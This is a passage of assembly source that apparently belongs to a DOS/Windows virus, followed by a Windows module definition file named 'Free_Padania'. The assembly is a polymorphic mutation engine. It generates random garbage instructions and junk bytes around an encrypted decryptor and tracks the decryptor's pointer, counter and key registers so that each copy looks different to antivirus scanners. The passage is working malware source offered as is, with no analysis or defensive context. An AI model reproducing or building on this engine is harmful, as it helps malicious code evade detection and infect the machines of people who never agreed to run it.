                   mov     al,byte ptr ds:[already_pnt]
                   add     al,40h
                   jmp     next_loop
   dec_cnt:
                   mov     al,byte ptr ds:[already_cnt]
                   add     al,48h
                   jmp     next_loop

   random_garbage:
                   call    sorta_random_07
                   mov     bx,ax
                   inc     bx                      ; so at least 1

   garbage:
                   push    si
                   mov     si,offset already_pnt

                   cmp     byte ptr ds:[si+4],0ffh
                   je      just_onebyters
   select_garb_reg:
                   call    sorta_random_07                 ; select with which
                                                           ; register

                   cmp     al,byte ptr ds:[si]
                   je      select_garb_reg

                   cmp     al,byte ptr ds:[si+1]
                   je      select_garb_reg

                   cmp     al,byte ptr ds:[si+3]
                   je      select_garb_reg

                   cmp     al,4
                   je      select_garb_reg                 ; no sp

                   cmp     al,byte ptr ds:[si+5]
                   je      select_garb_reg

                   cmp     al,byte ptr ds:[si+6]           ; don't use bx if ndd
                   je      select_garb_reg

                   mov     dl,al                           ; DL has reg for garb

   get_type:
                   call    sorta_random                    ; select type of
                   and     ax,01fh                         ; garbage

                   cmp     al,31d
                   je      just_onebyters

                   push    ax
                   mov     si,offset base_prefix
                   add     si,ax
                   mov     al,byte ptr ds:[si]
                   or      al,al
                   jz      no_prefix
                   stosb
   no_prefix:
                   pop     ax

                   push    ax
                   mov     si,offset base_ocs
                   add     si,ax
                   mov     al,byte ptr ds:[si]
                   add     al,dl           ; used register
                   stosb
                   pop     ax

                   mov     dl,al

                   cmp     dl,13d
                   jb      garbage_loop

                   call    sorta_random
                   stosb

                   cmp     dl,21d
                   jb      garbage_loop

                   call    sorta_random
                   stosb
                   jmp     garbage_loop
   just_onebyters:
                   call    sorta_random_07
                   cmp     al,6
                   ja      just_onebyters

                   mov     si,offset obyters
                   add     si,ax
                   mov     al,byte ptr ds:[si]
                   stosb

                   cmp     al,0ebh
                   jne     garbage_loop

                   call    sorta_random
                   and     ax,0fh

                   or      al,al
                   jnz     krap_shit

                   dec     di
   garbage_loop:
                   pop     si
                   dec     bx
                   jz      exit_garbage            ; loop
                   jmp     garbage
   exit_garbage:
                   ret

   krap_shit:
                   stosb

                   push    cx
                   mov     cx,ax
   krap_bytes:
                   call    sorta_random
                   stosb
                   loop    krap_bytes
                   pop     cx
                   jmp     garbage_loop

   ; the usual one byte garbage instructions. the last is a jmp short. when
   ; the jmp short will be used some nonsense bytes will be put between jmp
   ; start and destination. this ones don't alter registers
   obyters         db      90h,0f5h,0f8h,0f9h,0fch,0fdh,0ebh

   ; table with possible garbage instruction. the base_ocs are those that are
   ; changed by adding the register value. the base_prefix (if different from
   ; 00h) are just copied before (the [base_prefix+n] is the prefix for the
   ; [base_ocs+n] byte of course). some needs additional data too, check code
   ; before
   base_ocs        db     040h,048h,0f8h,0c0h,0c8h,0d0h,0d8h,0d0h,0d8h,0c0h,0c8h
                   db     0e0h,0e8h,0c0h,0e8h,0f0h,0d0h,0d8h,0c8h,0e0h,0f8h,0b8h
                   db     0e8h,0c0h,0f0h,0c8h,0e0h,0f8h,0d0h,0d8h,0c0h
   base_prefix     db     000h,000h,0d1h,0d3h,0d3h,0d1h,0d1h,0f7h,0f7h,0d1h,0d1h
                   db     0d1h,0d1h,083h,083h,083h,083h,083h,083h,083h,083h,000h
                   db     081h,081h,081h,081h,081h,081h,081h,081h,0f7h
   poly_mem_start:

   given_si        dw       00h
   lenght          dw       00h
   pointer_ass     dw       00h
   initial_key     dw       00h

   decr_begin      dw       00h
   counter_ass     dw       00h

   already_pnt     db      0ffh
   already_cnt     db      0ffh
   already_wrt     db      0ffh
   already_key     db      0ffh
   pushed_regs     db      0ffh
   dont_usethis    db      0ffh
   pushedbx        db      0ffh

   change_key      db       00h
   inc_pnt_nr      db       00h
   dec_cnt_nr      db       00h
   made_32bit      db       00h

   poly_mem_end:

   poly_mem        =       (offset poly_mem_end - offset poly_mem_start)


   ÄÄÄ[FREE.DEF]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   NAME            free
   DESCRIPTION     'Free_Padania'

   EXETYPE         WINDOWS
   CODE            PRELOAD MOVEABLE

   HEAPSIZE        1024
   STACKSIZE       5120
